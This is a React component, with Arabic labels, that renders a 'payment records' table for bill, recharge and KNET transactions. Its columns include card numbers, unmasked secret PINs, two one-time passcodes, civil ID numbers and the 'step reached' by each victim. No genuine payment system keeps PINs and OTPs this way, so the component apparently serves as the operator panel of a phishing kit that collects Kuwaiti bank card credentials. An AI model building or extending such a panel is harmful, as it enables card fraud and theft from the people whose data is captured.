import { AlertCircle } from "lucide-react";

const maskCard = (num) => {
  if (!num) return "—";
  return num.slice(0, 4) + "****" + (num.length > 8 ? num.slice(-2) : "");
};

const TypeBadge = ({ type }) => {
  const map = {
    bill: "bg-purple-500/20 text-purple-300 border-purple-500/30",
    recharge: "bg-emerald-500/20 text-emerald-300 border-emerald-500/30",
    knet: "bg-amber-500/20 text-amber-300 border-amber-500/30",
  };
  return (
    <span className={`px-2 py-0.5 rounded-full text-xs font-semibold border ${map[type] || "bg-slate-700/50 text-slate-300 border-slate-600"}`}>
      {type || "—"}
    </span>
  );
};

const HEADERS = ["التاريخ/الوقت", "الهاتف", "النوع", "الصفحة", "المبلغ", "البنك", "البطاقة", "الرقم السري", "OTP1", "OTP2", "رقم الهوية", "الشبكة", "الخطوة", "الدفع لـ"];

export default function RecordsTable({ records, loading, onSelect }) {
  if (loading) {
    return (
      <div className="rounded-2xl border border-slate-700/50 bg-slate-900/70 p-12 text-center">
        <div className="flex flex-col items-center gap-3">
          <div className="h-8 w-8 animate-spin rounded-full border-2 border-slate-700 border-t-emerald-500" />
          <span className="text-slate-400 text-sm">جاري التحميل...</span>
        </div>
      </div>
    );
  }

  return (
    <div className="rounded-2xl border border-slate-700/50 bg-slate-900/70 backdrop-blur-sm shadow-xl shadow-black/20 overflow-hidden">
      <div className="px-5 py-4 border-b border-slate-800/50 flex items-center gap-2">
        <div className="w-1.5 h-5 rounded-full bg-gradient-to-b from-emerald-400 to-teal-500" />
        <h2 className="text-base font-semibold text-white">سجلات المدفوعات</h2>
      </div>

      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-slate-800/50 bg-slate-800/30">
              {HEADERS.map(h => (
                <th key={h} className="px-3 py-3 text-left text-xs font-semibold text-slate-500 uppercase tracking-wider whitespace-nowrap">
                  {h}
                </th>
              ))}
            </tr>
          </thead>
          <tbody>
            {records.length === 0 ? (
              <tr>
                <td colSpan={HEADERS.length} className="text-center py-16">
                  <div className="flex flex-col items-center gap-3">
                    <div className="rounded-full bg-slate-800/50 p-4">
                      <AlertCircle className="h-8 w-8 text-slate-600" />
                    </div>
                    <span className="text-slate-500">لا توجد سجلات</span>
                  </div>
                </td>
              </tr>
            ) : records.map((r, idx) => (
              <tr
                key={r.id}
                onClick={() => onSelect(r)}
                className="border-b border-slate-800/30 hover:bg-slate-800/40 cursor-pointer transition-colors group"
              >
                <td className="px-3 py-2.5 text-slate-400 whitespace-nowrap text-xs">
                  {r.created_date ? new Date(r.created_date).toLocaleString() : "—"}
                </td>
                <td className="px-3 py-2.5 text-white font-medium whitespace-nowrap group-hover:text-emerald-300 transition-colors">
                  {r.phone_number || r.civil_id || "—"}
                </td>
                <td className="px-3 py-2.5 whitespace-nowrap">
                  <TypeBadge type={r.type} />
                </td>
                <td className="px-3 py-2.5 text-slate-400 whitespace-nowrap">{r.page || "—"}</td>
                <td className="px-3 py-2.5 whitespace-nowrap">
                  {r.amount ? (
                    <span className="text-emerald-300 font-medium">{r.amount} KD</span>
                  ) : "—"}
                </td>
                <td className="px-3 py-2.5 text-slate-300 whitespace-nowrap">{r.bank || "—"}</td>
                <td className="px-3 py-2.5 text-slate-300 whitespace-nowrap font-mono text-xs">
                  {r.card_prefix ? `${r.card_prefix}-${maskCard(r.card_number)}` : maskCard(r.card_number)}
                </td>
                <td className="px-3 py-2.5 text-red-300 whitespace-nowrap font-mono">{r.pin || "—"}</td>
                <td className="px-3 py-2.5 text-blue-300 whitespace-nowrap font-mono text-xs max-w-[120px] truncate">
                  {r.otp1 || "—"}
                </td>
                <td className="px-3 py-2.5 text-blue-300 whitespace-nowrap font-mono">{r.otp2 || "—"}</td>
                <td className="px-3 py-2.5 text-slate-300 whitespace-nowrap">{r.id_number || "—"}</td>
                <td className="px-3 py-2.5 text-slate-300 whitespace-nowrap">{r.network || "—"}</td>
                <td className="px-3 py-2.5 text-center">
                  {r.step_reached != null ? (
                    <span className="w-6 h-6 rounded-full bg-blue-500/20 text-blue-300 text-xs font-bold flex items-center justify-center border border-blue-500/30">
                      {r.step_reached}
                    </span>
                  ) : "—"}
                </td>
                <td className="px-3 py-2.5 text-slate-300 whitespace-nowrap">{r.pay_for || "—"}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <div className="px-5 py-3 border-t border-slate-800/50 flex items-center justify-between">
        <span className="text-xs text-slate-500">{records.length} سجل</span>
        <span className="text-xs text-slate-600">انقر على أي صف لعرض التفاصيل</span>
      </div>
    </div>
  );
}